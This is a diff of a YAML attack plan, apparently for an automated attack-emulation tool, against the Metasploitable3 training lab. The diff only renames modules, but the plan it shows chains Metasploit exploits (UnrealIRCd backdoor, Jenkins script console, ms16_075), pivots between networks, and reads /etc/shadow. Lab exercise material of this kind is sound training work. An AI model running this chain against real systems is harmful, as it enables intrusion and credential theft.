@@ -7,7 +7,7 @@
 # and get root privileges using the Docker daemon exploit. Afterwards we get data from the machine.
 # Next we set up routing tables, and move to the second network. There we find a Windows machine, exploit it using 
 # a known Jenkins vulnerability, get root access using ms16_075_reflection_juicy, and gather data about the system.
-# Required modules: mod_msf, mod_cmd, mod_nmap.
+# Required modules: metasploit, command, nmap.
 
 plan:
   name: Metasploitable3 example
@@ -26,7 +26,7 @@ plan:
           action: Scan the first network (for faster scans we use only the machine ip) for common ports
           target: Ubuntu
         arguments:
-          module: mod_nmap
+          module: nmap
           module_arguments:
             target: {{ ubuntu.host }}
             options: -T4
@@ -47,7 +47,7 @@ plan:
           action: Exploit IRCD backdoor
         arguments:
           create_named_session: session-ircd
-          module: mod_msf
+          module: metasploit
           module_arguments:
             module_type: exploit
             module: unix/irc/unreal_ircd_3281_backdoor
@@ -70,7 +70,7 @@ plan:
           action: Privilege escalation
         arguments:
           create_named_session: session-ubuntu-root
-          module: mod_msf
+          module: metasploit
           module_arguments:
             session_target: {{ ubuntu.host }}
             module_type: exploit
@@ -98,7 +98,7 @@ plan:
             action: Get system info
           arguments:
             use_named_session: session-ubuntu-root
-            module: mod_cmd
+            module: command
             module_arguments:
               cmd: sysinfo
           next:
@@ -113,7 +113,7 @@ plan:
           step_type: worker/execute
           arguments:
             use_named_session: session-ubuntu-root
-            module: mod_cmd
+            module: command
             module_arguments:
               cmd: cat /etc/shadow
           next:
@@ -128,7 +128,7 @@ plan:
           step_type: worker/execute
           arguments:
             use_named_session: session-ubuntu-root
-            module: mod_cmd
+            module: command
             module_arguments:
               cmd: ps
 
@@ -148,7 +148,7 @@ plan:
             action: Get host interfaces
           arguments:
             use_named_session: session-ubuntu-root
-            module: mod_cmd
+            module: command
             module_arguments:
               cmd: ifconfig
           next:
@@ -162,7 +162,7 @@ plan:
             action: Update MSF routing table
           step_type: worker/execute
           arguments:
-            module: mod_msf
+            module: metasploit
             module_arguments:
               module_type: post
               module: multi/manage/autoroute
@@ -186,7 +186,7 @@ plan:
         step_type: worker/execute
         is_init: true
         arguments:
-          module: mod_msf
+          module: metasploit
           module_arguments:
             module_type: auxiliary
             module: scanner/portscan/tcp
@@ -211,7 +211,7 @@ plan:
           is_init: true
           arguments:
             create_named_session: session-jenkins
-            module: mod_msf
+            module: metasploit
             module_arguments:
               module_type: exploit
               module: multi/http/jenkins_script_console
@@ -235,7 +235,7 @@ plan:
           step_type: worker/execute
           arguments:
             create_named_session: session-windows-root
-            module: mod_msf
+            module: metasploit
             module_arguments:
               session_target: {{ attacker.host }}  # This is due to the nature of the exploit
               module_type: exploit
@@ -263,7 +263,7 @@ plan:
             action: Get user and its privileges
           arguments:
             use_named_session: session-windows-root
-            module: mod_cmd
+            module: command
             module_arguments:
               cmd: execute -f whoami -i -a /all
           next:
@@ -278,6 +278,6 @@ plan:
             action: Get tasklist
           arguments:
             use_named_session: session-windows-root
-            module: mod_cmd
+            module: command
             module_arguments:
               cmd: execute -f tasklist -i
